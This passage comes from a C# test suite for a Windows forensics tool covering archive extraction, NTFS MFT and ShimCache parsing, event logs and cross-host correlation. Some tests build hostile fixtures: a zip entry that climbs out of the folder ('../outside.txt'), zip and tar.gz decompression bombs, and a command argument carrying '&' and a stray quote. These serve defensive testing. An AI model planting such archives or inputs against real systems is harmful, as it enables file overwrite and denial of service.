            string dir = Path.Combine(Path.GetTempPath(), "IRCollectZipT_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(dir);
            string zipPath = Path.Combine(dir, "t.zip");
            string extractDir = Path.Combine(dir, "out");
            try
            {
                Directory.CreateDirectory(extractDir);
                using (var fs = new FileStream(zipPath, FileMode.Create))
                using (var archive = new ZipArchive(fs, ZipArchiveMode.Create))
                {
                    string entryName = ".." + Path.AltDirectorySeparatorChar + "outside.txt";
                    ZipArchiveEntry e = archive.CreateEntry(entryName, CompressionLevel.Fastest);
                    using (var w = new StreamWriter(e.Open()))
                        w.Write("bad");
                }
                try
                {
                    CaseManager.ExtractZipSafely(zipPath, extractDir);
                    return false;
                }
                catch (InvalidDataException)
                {
                    return true;
                }
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool ExtractZip_accepts_plain_entry()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectZipG_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(dir);
            string zipPath = Path.Combine(dir, "t.zip");
            string extractDir = Path.Combine(dir, "out");
            try
            {
                Directory.CreateDirectory(extractDir);
                using (var fs = new FileStream(zipPath, FileMode.Create))
                using (var archive = new ZipArchive(fs, ZipArchiveMode.Create))
                {
                    ZipArchiveEntry e = archive.CreateEntry("ok.txt", CompressionLevel.Fastest);
                    using (var w = new StreamWriter(e.Open()))
                        w.Write("ok");
                }
                CaseManager.ExtractZipSafely(zipPath, extractDir);
                return File.Exists(Path.Combine(extractDir, "ok.txt"));
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool ArchiveIntake_zip_maps_windows_invalid_name()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectZipMap_" + Guid.NewGuid().ToString("N"));
            string zipPath = Path.Combine(dir, "uac.zip");
            string extractDir = Path.Combine(dir, "out");
            try
            {
                Directory.CreateDirectory(dir);
                using (var fs = new FileStream(zipPath, FileMode.Create))
                using (var archive = new ZipArchive(fs, ZipArchiveMode.Create))
                {
                    ZipArchiveEntry e = archive.CreateEntry("uac/[root]/tmp/name:stream.txt", CompressionLevel.Fastest);
                    using (var w = new StreamWriter(e.Open(), new UTF8Encoding(false)))
                        w.Write("evidence");
                }

                ArchiveExtractionResult result = ArchiveIntake.ExtractSafely(zipPath, extractDir);
                ArchiveEntryRecord record = result.Entries.FirstOrDefault(x =>
                    string.Equals(x.OriginalPath, "uac/[root]/tmp/name:stream.txt", StringComparison.Ordinal));
                if (record == null || string.Equals(record.OriginalPath, record.ExtractedPath, StringComparison.Ordinal)) return false;
                if (!string.Equals(record.Status, "renamed-for-windows", StringComparison.Ordinal)) return false;
                string extracted = Path.Combine(extractDir, record.ExtractedPath.Replace('/', Path.DirectorySeparatorChar));
                return File.Exists(extracted) &&
                    File.ReadAllText(extracted).IndexOf("evidence", StringComparison.Ordinal) >= 0 &&
                    File.Exists(Path.Combine(extractDir, ArtifactNames.UacArchiveEntriesCsv));
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool ArchiveIntake_tar_pax_preserves_unicode_path()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectPax_" + Guid.NewGuid().ToString("N"));
            string archivePath = Path.Combine(dir, "pax.tar.gz");
            string extractDir = Path.Combine(dir, "out");
            const string unicodePath = "uac/[root]/home/analyst/\u8abf\u67e5\u8a18\u9304.txt";
            try
            {
                Directory.CreateDirectory(dir);
                using (FileStream file = new FileStream(archivePath, FileMode.Create, FileAccess.Write, FileShare.None))
                using (GZipStream gzip = new GZipStream(file, CompressionMode.Compress))
                {
                    WriteTarEntry(gzip, "PaxHeader", BuildPaxRecord("path", unicodePath), 'x');
                    WriteTarEntry(gzip, "placeholder.txt", Encoding.UTF8.GetBytes("unicode evidence"), '0');
                    gzip.Write(new byte[1024], 0, 1024);
                }

                ArchiveExtractionResult result = ArchiveIntake.ExtractSafely(archivePath, extractDir);
                ArchiveEntryRecord record = result.Entries.FirstOrDefault(x => string.Equals(x.OriginalPath, unicodePath, StringComparison.Ordinal));
                if (record == null) return false;
                string extracted = Path.Combine(extractDir, record.ExtractedPath.Replace('/', Path.DirectorySeparatorChar));
                return File.Exists(extracted) && File.ReadAllText(extracted).IndexOf("unicode evidence", StringComparison.Ordinal) >= 0;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool ArchiveIntake_rejects_zip_expansion_bomb_without_partial_output()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectZipBomb_" + Guid.NewGuid().ToString("N"));
            string archivePath = Path.Combine(dir, "bomb.zip");
            string extractDir = Path.Combine(dir, "out");
            try
            {
                Directory.CreateDirectory(dir);
                using (var fs = new FileStream(archivePath, FileMode.Create, FileAccess.Write, FileShare.None))
                using (var archive = new ZipArchive(fs, ZipArchiveMode.Create))
                {
                    ZipArchiveEntry entry = archive.CreateEntry("zeros.bin", CompressionLevel.Optimal);
                    using (Stream output = entry.Open())
                    {
                        byte[] zeros = new byte[1024 * 1024];
                        output.Write(zeros, 0, zeros.Length);
                    }
                }

                var options = CreateSmallArchiveSafetyOptions();
                options.ExpansionRatioMinimumBytes = 1;
                options.MaxExpansionRatio = 2.0;
                bool rejected = false;
                try { ArchiveIntake.ExtractSafely(archivePath, extractDir, options); }
                catch (InvalidDataException) { rejected = true; }
                return rejected && HasNoPublishedOrStagingOutput(dir, extractDir);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool ArchiveIntake_rejects_targz_expansion_bomb_without_partial_output()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectTarBomb_" + Guid.NewGuid().ToString("N"));
            string archivePath = Path.Combine(dir, "bomb.tar.gz");
            string extractDir = Path.Combine(dir, "out");
            try
            {
                Directory.CreateDirectory(dir);
                using (FileStream file = new FileStream(archivePath, FileMode.Create, FileAccess.Write, FileShare.None))
                using (GZipStream gzip = new GZipStream(file, CompressionMode.Compress))
                {
                    WriteTarEntry(gzip, "uac/[root]/tmp/zeros.bin", new byte[1024 * 1024], '0');
                    gzip.Write(new byte[1024], 0, 1024);
                }

                var options = CreateSmallArchiveSafetyOptions();
                options.ExpansionRatioMinimumBytes = 1;
                options.MaxExpansionRatio = 2.0;
                bool rejected = false;
                try { ArchiveIntake.ExtractSafely(archivePath, extractDir, options); }
                catch (InvalidDataException) { rejected = true; }
                return rejected && HasNoPublishedOrStagingOutput(dir, extractDir);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool ArchiveIntake_rejects_low_disk_without_partial_output()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectLowDisk_" + Guid.NewGuid().ToString("N"));
            string archivePath = Path.Combine(dir, "evidence.zip");
            string extractDir = Path.Combine(dir, "out");
            try
            {
                Directory.CreateDirectory(dir);
                using (var fs = new FileStream(archivePath, FileMode.Create, FileAccess.Write, FileShare.None))
                using (var archive = new ZipArchive(fs, ZipArchiveMode.Create))
                {
                    ZipArchiveEntry entry = archive.CreateEntry("evidence.bin", CompressionLevel.NoCompression);
                    using (Stream output = entry.Open())
                    {
                        byte[] bytes = new byte[4096];
                        for (int i = 0; i < bytes.Length; i++) bytes[i] = (byte)(i % 251);
                        output.Write(bytes, 0, bytes.Length);
                    }
                }

                var options = CreateSmallArchiveSafetyOptions();
                options.AvailableFreeSpaceBytesOverride = 4096;
                options.MinimumFreeSpaceBytes = 1024;
                bool rejected = false;
                try { ArchiveIntake.ExtractSafely(archivePath, extractDir, options); }
                catch (IOException) { rejected = true; }
                return rejected && HasNoPublishedOrStagingOutput(dir, extractDir);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool ArchiveIntake_cancellation_leaves_no_partial_output()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectCancel_" + Guid.NewGuid().ToString("N"));
            string archivePath = Path.Combine(dir, "evidence.zip");
            string extractDir = Path.Combine(dir, "out");
            try
            {
                Directory.CreateDirectory(dir);
                using (var fs = new FileStream(archivePath, FileMode.Create, FileAccess.Write, FileShare.None))
                using (var archive = new ZipArchive(fs, ZipArchiveMode.Create))
                {
                    ZipArchiveEntry entry = archive.CreateEntry("evidence.txt", CompressionLevel.Fastest);
                    using (var writer = new StreamWriter(entry.Open(), new UTF8Encoding(false)))
                        writer.Write("cancelled evidence");
                }

                var cancellation = new CancellationTokenSource();
                cancellation.Cancel();
                bool cancelled = false;
                try { ArchiveIntake.ExtractSafely(archivePath, extractDir, cancellation.Token); }
                catch (OperationCanceledException) { cancelled = true; }
                finally { cancellation.Dispose(); }
                return cancelled && HasNoPublishedOrStagingOutput(dir, extractDir);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static ArchiveIntakeOptions CreateSmallArchiveSafetyOptions()
        {
            return new ArchiveIntakeOptions
            {
                MaxArchiveEntries = 100,
                MaxExtractedBytes = 4L * 1024 * 1024,
                MaxSingleEntryBytes = 2L * 1024 * 1024,
                ExpansionRatioMinimumBytes = 1024 * 1024,
                MaxExpansionRatio = 1000.0,
                MinimumFreeSpaceBytes = 0,
                AvailableFreeSpaceBytesOverride = 16L * 1024 * 1024
            };
        }

        private static bool HasNoPublishedOrStagingOutput(string parent, string destination)
        {
            if (Directory.Exists(destination) || File.Exists(destination)) return false;
            string name = Path.GetFileName(destination);
            return Directory.GetDirectories(parent, name + ".partial-*", SearchOption.TopDirectoryOnly).Length == 0;
        }

        private static bool Cli_unknown_arg_exits_nonzero()
        {
            string exe = Assembly.GetExecutingAssembly().Location;
            if (string.IsNullOrEmpty(exe) || !File.Exists(exe))
                return false;

            var psi = new ProcessStartInfo
            {
                FileName = exe,
                Arguments = "--IRCollectNonexistentFlag987",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };
            using (Process p = Process.Start(psi))
            {
                if (p == null) return false;
                if (!p.WaitForExit(120000))
                {
                    try { p.Kill(); } catch { }
                    return false;
                }
                return p.ExitCode == 1;
            }
        }

        private static bool EscapeArgForCmd_quotes_metachars_without_caret_corruption()
        {
            // '&' must be preserved verbatim inside quotes (the old code injected a stray '^').
            string amp = Collector.CommandHelper.EscapeArgForCmd(@"C:\out\a&b\reg.hiv");
            if (amp != "\"C:\\out\\a&b\\reg.hiv\"") return false;
            // A path with a space is quoted.
            string sp = Collector.CommandHelper.EscapeArgForCmd(@"C:\Program Files\x.reg");
            if (sp != "\"C:\\Program Files\\x.reg\"") return false;
            // A plain path with no metachars is returned unquoted, unchanged.
            string plain = Collector.CommandHelper.EscapeArgForCmd(@"C:\out\reg.hiv");
            if (plain != @"C:\out\reg.hiv") return false;
            // A stray double-quote (illegal in real paths) is stripped so it cannot break out of quoting.
            string q = Collector.CommandHelper.EscapeArgForCmd("a\"b c");
            if (q.IndexOf('"') != 0 || q[q.Length - 1] != '"') return false; // wrapped
            if (q.Substring(1, q.Length - 2).IndexOf('"') >= 0) return false; // no inner quote remains
            return true;
        }

        private static bool FactTime_ToComparableUtc_aligns_local_and_utc_same_instant()
        {
            DateTime utc = new DateTime(2024, 6, 1, 12, 0, 0, DateTimeKind.Utc);
            // Same instant expressed as naive-local (how EventLog/Process/Activity facts arrive).
            DateTime localNaive = DateTime.SpecifyKind(utc.ToLocalTime(), DateTimeKind.Unspecified);
            DateTime a = FactStore.ToComparableUtc(utc);
            DateTime b = FactStore.ToComparableUtc(localNaive);
            return a == b && a.Kind == DateTimeKind.Utc;
        }

        private static bool FactStore_GetByTimeRange_matches_mixed_kind_same_instant()
        {
            var store = new FactStore();
            DateTime utcInstant = new DateTime(2024, 6, 1, 12, 0, 0, DateTimeKind.Utc);
            // Fact carries UTC kind (like MFT FromFileTimeUtc / ShellBags).
            var f = new Fact("id", utcInstant, "MFT", "Observed");
            f.EntityRefs.Add(new EntityRef("Path", "x"));
            store.Facts.Add(f);
            store.BuildEntityIndex();
            // Window expressed in naive-local time (like UI date pickers). Before the fix this
            // would be off by the host UTC offset and could miss the UTC-kind fact.
            DateTime localNaive = DateTime.SpecifyKind(utcInstant.ToLocalTime(), DateTimeKind.Unspecified);
            var hits = store.GetByTimeRange(localNaive.AddMinutes(-1), localNaive.AddMinutes(1));
            return hits.Count == 1;
        }

        private static bool SrumDecodeIdBlob_distinguishes_sid_from_utf16_text()
        {
            // Real SID S-1-5-18 (LocalSystem): rev=1, subAuthCount=1, authority=5, subAuth=18.
            byte[] sid = new byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x12, 0x00, 0x00, 0x00 };
            if (!string.Equals(SrumExporter.DecodeIdBlob(sid), "S-1-5-18", StringComparison.OrdinalIgnoreCase)) return false;

            // UTF-16 AppId text (2nd byte 0x00) must NOT be misread as a SID.
            byte[] text = Encoding.Unicode.GetBytes("C:\\app.exe");
            string t = SrumExporter.DecodeIdBlob(text);
            return t.IndexOf("C:\\app.exe", StringComparison.OrdinalIgnoreCase) >= 0
                && !t.StartsWith("S-", StringComparison.OrdinalIgnoreCase);
        }

        private static bool MftNormalizer_action_reflects_timestamp_source()
        {
            var entries = new List<IR_Collect.MFT.MftParser.MftEntry>();
            // Created invalid -> time falls back to Modified -> Action must be "Modified", not "Created".
            entries.Add(new IR_Collect.MFT.MftParser.MftEntry
            {
                RecordNumber = 5,
                FullPath = "\\Windows\\a.dll",
                Created = DateTime.MinValue,
                Modified = new DateTime(2024, 3, 1, 12, 0, 0)
            });
            // Created valid -> Action "Created".
            entries.Add(new IR_Collect.MFT.MftParser.MftEntry
            {
                RecordNumber = 6,
                FullPath = "\\Windows\\b.dll",
                Created = new DateTime(2024, 2, 1, 9, 0, 0),
                Modified = new DateTime(2024, 3, 1, 12, 0, 0)
            });
            var facts = MftNormalizer.ToFacts(entries, 10);
            if (facts.Count != 2) return false;
            var fb = facts[0];
            var ok = facts[1];
            return string.Equals(fb.Action, "Modified", StringComparison.Ordinal)
                && fb.FallbackUsed
                && fb.Time == new DateTime(2024, 3, 1, 12, 0, 0)
                && string.Equals(ok.Action, "Created", StringComparison.Ordinal);
        }

        private static bool EventLog_5145_composes_absolute_path_from_share_local_path()
        {
            string dir = CreateTempDir("IRCollectEvt5145Abs_");
            try
            {
                string csv = Path.Combine(dir, "Security_filtered.csv");
                WriteEventLogCsv(csv, new[]
                {
                    BuildEventLogRow(
                        "2026-04-08T10:02:00Z",
                        "5145",
                        "Microsoft-Windows-Security-Auditing",
                        "Share access checked.",
                        "SubjectUserName=bob | ShareName=\\\\server\\share | ShareLocalPath=C:\\Shares\\Team | RelativeTargetName=docs\\secret.txt")
                });
                List<Fact> facts = EventLogNormalizer.ToFacts(csv, "Security");
                if (facts.Count != 1) return false;
                Fact f = facts[0];
                return HasEntity(f, "Path", "C:\\Shares\\Team\\docs\\secret.txt") // composed absolute
                    && HasEntity(f, "Path", "docs\\secret.txt");                   // relative still present
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool MftRunList_parses_valid_and_survives_truncation()
        {
            // NTFS run-list encoding: [header=(offSize<<4)|lenSize][length LE][offset LE]..., 0x00 terminates.
            // Two 1+1-byte runs (header 0x11) then terminator.
            byte[] good = new byte[] { 0x11, 0x10, 0x20, 0x11, 0x05, 0x03, 0x00 };
            var runs = IR_Collect.MFT.MftDumper.ParseRunList(good, 0, good.Length);
            if (runs == null || runs.Count != 2) return false;

            // Truncated: header claims 4+4 bytes but only 2 trailing bytes exist — must NOT throw.
            byte[] bad = new byte[] { 0x44, 0x01, 0x02 };
            var runs2 = IR_Collect.MFT.MftDumper.ParseRunList(bad, 0, bad.Length);
            if (runs2 == null || runs2.Count != 0) return false;

            // `end` past the buffer (attacker-influenced attribute length) is clamped, not over-read.
            var runs3 = IR_Collect.MFT.MftDumper.ParseRunList(good, 0, 9999);
            return runs3 != null && runs3.Count == 2;
        }

        private static bool MftFixup_restores_bytes_at_sector_boundaries()
        {
            // NTFS replaces the last 2 bytes of each 512-byte sector with the USN; the originals live in
            // the Update Sequence Array. After fixup those boundary bytes must hold the USA values.
            byte[] rec = new byte[1024];
            rec[0] = 0x46; rec[1] = 0x49; rec[2] = 0x4C; rec[3] = 0x45;   // "FILE"
            rec[0x04] = 0x30; rec[0x05] = 0x00;                            // usaOffset = 0x30
            rec[0x06] = 0x03; rec[0x07] = 0x00;                            // usaCount  = 3 (USN + 2 sectors)
            rec[0x30] = 0xAA; rec[0x31] = 0xBB;                            // USN signature word
            rec[0x32] = 0x11; rec[0x33] = 0x22;                            // USA[1] -> sector 1 original
            rec[0x34] = 0x33; rec[0x35] = 0x44;                            // USA[2] -> sector 2 original
            rec[510] = 0xAA; rec[511] = 0xBB;                              // sector 1 boundary (holds USN)
            rec[1022] = 0xAA; rec[1023] = 0xBB;                           // sector 2 boundary (holds USN)
            bool applied = IR_Collect.MFT.MftParser.ApplyUsnFixup(rec, 1024);
            return applied
                && rec[510] == 0x11 && rec[511] == 0x22
                && rec[1022] == 0x33 && rec[1023] == 0x44;
        }

        // Build a resident $FILE_NAME attribute carrying a name in the given namespace (1=Win32, 2=DOS).
        private static byte[] BuildFileNameAttr(string name, byte ns)
        {
            byte[] nameBytes = Encoding.Unicode.GetBytes(name);
            int contentLen = 0x42 + nameBytes.Length;
            int attrLen = 0x18 + contentLen;
            if (attrLen % 8 != 0) attrLen += 8 - (attrLen % 8);
            byte[] a = new byte[attrLen];
            BitConverter.GetBytes((uint)0x30).CopyTo(a, 0);                // type = $FILE_NAME
            BitConverter.GetBytes((uint)attrLen).CopyTo(a, 4);            // attribute length
            a[8] = 0;                                                      // resident
            BitConverter.GetBytes((uint)contentLen).CopyTo(a, 0x10);     // content length
            BitConverter.GetBytes((ushort)0x18).CopyTo(a, 0x14);         // content offset
            int c = 0x18;
            BitConverter.GetBytes((ulong)5).CopyTo(a, c + 0x00);         // parent ref (root)
            a[c + 0x40] = (byte)name.Length;                              // name length (chars)
            a[c + 0x41] = ns;                                             // namespace
            nameBytes.CopyTo(a, c + 0x42);
            return a;
        }

        private static byte[] BuildMftRecordWithAttrs(byte[][] attrs)
        {
            byte[] rec = new byte[1024];
            rec[0] = 0x46; rec[1] = 0x49; rec[2] = 0x4C; rec[3] = 0x45;   // "FILE"
            BitConverter.GetBytes((ushort)0x38).CopyTo(rec, 0x14);        // first attribute offset
            BitConverter.GetBytes((ushort)0x01).CopyTo(rec, 0x16);        // flags: InUse
            int off = 0x38;
            foreach (var at in attrs) { Array.Copy(at, 0, rec, off, at.Length); off += at.Length; }
            BitConverter.GetBytes((uint)0xFFFFFFFF).CopyTo(rec, off);     // attribute end marker
            return rec;
        }

        private static byte[] BuildAttributeListAttr(ulong extensionRecordNumber)
        {
            const int contentLength = 0x20;
            const int attributeLength = 0x38;
            byte[] attribute = new byte[attributeLength];
            BitConverter.GetBytes((uint)0x20).CopyTo(attribute, 0);
            BitConverter.GetBytes((uint)attributeLength).CopyTo(attribute, 4);
            BitConverter.GetBytes((uint)contentLength).CopyTo(attribute, 0x10);
            BitConverter.GetBytes((ushort)0x18).CopyTo(attribute, 0x14);
            int entry = 0x18;
            BitConverter.GetBytes((uint)0x30).CopyTo(attribute, entry);
            BitConverter.GetBytes((ushort)contentLength).CopyTo(attribute, entry + 4);
            BitConverter.GetBytes(extensionRecordNumber).CopyTo(attribute, entry + 0x10);
            return attribute;
        }

        private static bool MftParser_prefers_win32_long_name_over_dos_short_name()
        {
            byte[] dos = BuildFileNameAttr("TEST~1.TXT", 2);
            byte[] win = BuildFileNameAttr("testfile.txt", 1);
            // DOS first then Win32: the Win32 long name must still win (not the last attribute).
            var e1 = IR_Collect.MFT.MftParser.ParseRecord(BuildMftRecordWithAttrs(new[] { dos, win }), 7);
            if (e1 == null || !string.Equals(e1.FileName, "testfile.txt", StringComparison.Ordinal)) return false;
            // Win32 first then DOS: still the Win32 long name.
            var e2 = IR_Collect.MFT.MftParser.ParseRecord(BuildMftRecordWithAttrs(new[] { win, dos }), 7);
            return e2 != null && string.Equals(e2.FileName, "testfile.txt", StringComparison.Ordinal);
        }

        private static bool MftParser_follows_resident_attribute_list_file_name_extension()
        {
            string dir = CreateTempDir("IRCollectMftAttributeList_");
            try
            {
                string path = Path.Combine(dir, "$MFT");
                byte[] image = new byte[9 * 1024];
                byte[] baseRecord = BuildMftRecordWithAttrs(new[]
                {
                    BuildFileNameAttr("LONGNA~1.TXT", 2),
                    BuildAttributeListAttr(((ulong)4 << 48) | 8)
                });
                byte[] extensionRecord = BuildMftRecordWithAttrs(new[]
                {
                    BuildFileNameAttr("LongNameFromExtension.txt", 1)
                });
                BitConverter.GetBytes((ushort)3).CopyTo(baseRecord, 0x10);
                BitConverter.GetBytes((ushort)4).CopyTo(extensionRecord, 0x10);
                BitConverter.GetBytes(((ulong)3 << 48) | 7).CopyTo(extensionRecord, 0x20);
                Array.Copy(baseRecord, 0, image, 7 * 1024, 1024);
                Array.Copy(extensionRecord, 0, image, 8 * 1024, 1024);
                File.WriteAllBytes(path, image);

                IR_Collect.MFT.MftParser.ParseResult parsed =
                    IR_Collect.MFT.MftParser.ParseWithDiagnostics(path, 16);
                IR_Collect.MFT.MftParser.MftEntry entry = parsed.Entries.FirstOrDefault(x => x.RecordNumber == 7);
                if (entry == null ||
                    !string.Equals(entry.FileName, "LongNameFromExtension.txt", StringComparison.Ordinal))
                    return false;

                byte[] staleBase = BuildMftRecordWithAttrs(new[]
                {
                    BuildFileNameAttr("LONGNA~1.TXT", 2),
                    BuildAttributeListAttr(((ulong)5 << 48) | 8)
                });
                BitConverter.GetBytes((ushort)3).CopyTo(staleBase, 0x10);
                Array.Copy(staleBase, 0, image, 7 * 1024, 1024);
                File.WriteAllBytes(path, image);
                parsed = IR_Collect.MFT.MftParser.ParseWithDiagnostics(path, 16);
                entry = parsed.Entries.FirstOrDefault(x => x.RecordNumber == 7);
                return entry != null && string.Equals(entry.FileName, "LONGNA~1.TXT", StringComparison.Ordinal);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        // Build one Win10 ("10ts") AppCompatCache value: a header whose first DWORD points at the
        // single entry, then a structured entry carrying a UTF-16 path and a FILETIME.
        private static byte[] BuildWin10ShimValue(string path, DateTime lastModifiedUtc)
        {
            byte[] pathBytes = Encoding.Unicode.GetBytes(path);
            int entryDataSize = 2 + pathBytes.Length + 8 + 4;   // pathSize + path + FILETIME + dataSize(0)
            const int headerSize = 0x30;
            byte[] v = new byte[headerSize + 12 + entryDataSize];
            BitConverter.GetBytes(headerSize).CopyTo(v, 0);     // header DWORD == offset to first entry

            int o = headerSize;
            v[o] = 0x31; v[o + 1] = 0x30; v[o + 2] = 0x74; v[o + 3] = 0x73; // "10ts"
            // o+4..o+7 unknown/seq = 0
            BitConverter.GetBytes(entryDataSize).CopyTo(v, o + 8);
            BitConverter.GetBytes((ushort)pathBytes.Length).CopyTo(v, o + 12);
            pathBytes.CopyTo(v, o + 14);
            int p = o + 14 + pathBytes.Length;
            BitConverter.GetBytes(lastModifiedUtc.ToFileTimeUtc()).CopyTo(v, p);
            // trailing dataSize DWORD stays 0
            return v;
        }

        private static bool ShimCache_structured_win10_entry_recovers_path_and_filetime()
        {
            var when = new DateTime(2025, 3, 14, 9, 30, 0, DateTimeKind.Utc);
            byte[] value = BuildWin10ShimValue(@"C:\Windows\System32\evil.exe", when);
            var r = ShimCacheParser.ParseValueBytesForTest("AppCompatCache", value);
            if (r.Entries.Count != 1) return false;
            var e = r.Entries[0];
            return string.Equals(e.Path, @"C:\Windows\System32\evil.exe", StringComparison.Ordinal)
                && string.Equals(e.FileName, "evil.exe", StringComparison.Ordinal)
                && string.Equals(e.LastModifiedTime, "2025-03-14T09:30:00", StringComparison.Ordinal);
        }

        // Write a minimal artifact folder: system_info.txt (hostname) + mft_preview.csv with one row for
        // `path`, so LoadCaseFromFolder + BuildFromCase yield a single MFT Path-entity fact.
        private static void WriteMiniCaseFolder(string dir, string hostname, string path)
        {
            Directory.CreateDirectory(dir);
            File.WriteAllText(Path.Combine(dir, IR_Collect.ArtifactNames.SystemInfoTxt), "Hostname: " + hostname + "\r\n", Encoding.UTF8);
            var csv = new StringBuilder();
            csv.AppendLine("RecordNumber,InUse,IsDir,FileName,FullPath,Size,StdCreated,StdModified,StdMftModified,StdAccessed,FnCreated,FnModified,FnMftModified,FnAccessed");
            string name = System.IO.Path.GetFileName(path);
            csv.AppendLine("7,True,False," + name + "," + path + ",2048,2025-02-01 12:00:00,2025-02-01 12:00:00,2025-02-01 12:00:00,2025-02-01 12:00:00,,,,");
            File.WriteAllText(Path.Combine(dir, IR_Collect.ArtifactNames.MftPreviewCsv), csv.ToString(), Encoding.UTF8);
        }

        // Phase 3.2: two hosts that each touched the same file path must surface that path as a cross-host
        // shared entity, and the report must serialize to the correlation_v1 schema.
        private static bool CorrelateCli_finds_shared_entity_across_two_folders()
        {
            string a = Path.Combine(Path.GetTempPath(), "ircol_corrA_" + Guid.NewGuid().ToString("N"));
            string b = Path.Combine(Path.GetTempPath(), "ircol_corrB_" + Guid.NewGuid().ToString("N"));
            try
            {
                const string shared = "C:\\Temp\\shared_evil.exe";
                WriteMiniCaseFolder(a, "HOSTA", shared);
                WriteMiniCaseFolder(b, "HOSTB", shared);

                var ca = IR_Collect.Analysis.CaseManager.LoadCaseFromFolder(a);
                ca.FactStore = IR_Collect.Analysis.Correlation.FactStore.BuildFromCase(ca);
                var cb = IR_Collect.Analysis.CaseManager.LoadCaseFromFolder(b);
                cb.FactStore = IR_Collect.Analysis.Correlation.FactStore.BuildFromCase(cb);

                var report = IR_Collect.Analysis.CorrelationCli.BuildReport(
                    new[] { ca, cb }, new[] { "Path" }, null);
                if (report == null || report.HostCount != 2) return false;

                var hit = report.SharedEntities.FirstOrDefault(s =>
                    s.Value != null && s.Value.IndexOf("shared_evil.exe", StringComparison.OrdinalIgnoreCase) >= 0);
                if (hit == null) return false;
                if (hit.HostCount != 2) return false;
                if (!(hit.Hosts.Contains("HOSTA") && hit.Hosts.Contains("HOSTB"))) return false;

                string json = IR_Collect.Analysis.CorrelationExport.Serialize(report);
                return !string.IsNullOrEmpty(json)
                    && json.IndexOf("correlation_v1", StringComparison.Ordinal) >= 0
                    && json.IndexOf("shared_evil.exe", StringComparison.Ordinal) >= 0;
            }
            catch
            {
                return false;
            }
            finally
            {
                try { if (Directory.Exists(a)) Directory.Delete(a, true); } catch { }
                try { if (Directory.Exists(b)) Directory.Delete(b, true); } catch { }
            }
        }

        // Drift guard: generated correlation_v1 / graph_v1 / diff_v1 JSON must contain every field the published
        // JSON Schema files (docs/schemas/) mark as required, so the documented contract can't silently
        // diverge from the code.
        private static bool OutputSchemas_required_fields_present_in_generated_json()
        {
            try
            {
                var corr = IR_Collect.Analysis.CorrelationCli.BuildReport(new IR_Collect.Analysis.CaseData[0], new[] { "Path" }, null);
                string cj = IR_Collect.Analysis.CorrelationExport.Serialize(corr);
                string[] corrReq = { "export_schema", "generated_at", "tool_name", "tool_version", "host_count", "hosts", "shared_entities", "temporal_correlations" };
                foreach (string field in corrReq)
                    if (cj.IndexOf("\"" + field + "\"", StringComparison.Ordinal) < 0) return false;
                if (cj.IndexOf("\"correlation_v1\"", StringComparison.Ordinal) < 0) return false;

                var g = IR_Collect.Analysis.GraphCli.BuildGraph(new IR_Collect.Analysis.CaseData[0], "Path", "x", 1, null);
                string gj = IR_Collect.Analysis.GraphCli.Serialize(g);
                string[] graphReq = { "export_schema", "generated_at", "tool_name", "tool_version", "seed_type", "seed_value", "max_depth", "host_count", "node_count", "edge_count", "nodes", "edges" };
                foreach (string field in graphReq)
                    if (gj.IndexOf("\"" + field + "\"", StringComparison.Ordinal) < 0) return false;
                if (gj.IndexOf("\"graph_v1\"", StringComparison.Ordinal) < 0) return false;

                CaseData baseline = CreateDiffCase("schema-baseline");
                CaseData target = CreateDiffCase("schema-target");
                string dj = DiffExport.Serialize(DiffBuilder.Build(baseline, target));
                string[] diffReq = { "diff_schema", "generated_at", "tool_name", "tool_version", "analysis_mode", "baseline_ref", "target_ref", "change_count", "changes_truncated", "max_changes", "changes" };
                foreach (string field in diffReq)
                    if (dj.IndexOf("\"" + field + "\"", StringComparison.Ordinal) < 0) return false;
                if (dj.IndexOf("\"diff_v1\"", StringComparison.Ordinal) < 0) return false;

                string sj = SummaryExport.Serialize(new SummaryPayload
                {
                    ExportSchema = "summary_v3",
                    FactStoreBuildMode = "Incremental",
                    FactStoreBuildGeneratedAt = DateTime.UtcNow.ToString("o"),
                    FactStoreBuildDetail = "test",
                    CollectionCoverage = new CollectionCoverageReport
                    {
                        CollectionModeProfile = CollectionModeProfileHelper.ForensicStrict,
                        OperatorAcknowledgedRisks = true,
                        OutputTargetClass = CollectionImpactPolicy.OutputSystemDisk,
                        RestrictedSteps = new List<string> { CollectionImpactPolicy.DeepScanStep },
                        SkippedByProfile = new List<string> { CollectionImpactPolicy.MemoryAcquisitionStep }
                    },
                    FactStoreBuildInputs = new List<FactStoreInputFingerprint>
                    {
                        new FactStoreInputFingerprint
                        {
                            RelativePath = "evidence/Process.csv",
                            Size = 1,
                            MtimeUtc = DateTime.UtcNow.ToString("o"),
                            Sha256 = new string('a', 64),
                            NormalizerName = "Process"
                        }
                    }
                });
                string[] summaryBuildFields = {
                    "fact_store_build_mode", "fact_store_build_generated_at", "fact_store_build_detail",
                    "fact_store_build_inputs", "relative_path", "normalizer_name",
                    "operator_acknowledged_risks", "restricted_steps", "skipped_by_profile", "output_target_class"
                };
                foreach (string field in summaryBuildFields)
                    if (sj.IndexOf("\"" + field + "\"", StringComparison.Ordinal) < 0) return false;
                return true;
            }
            catch
            {
                return false;
            }
        }

        // Integration + drift guard for the committed teaching sample (docs/sample-case/). Loading the two
        // synthetic hosts through the real analysis pipeline must trip exactly the documented Guided Hunt
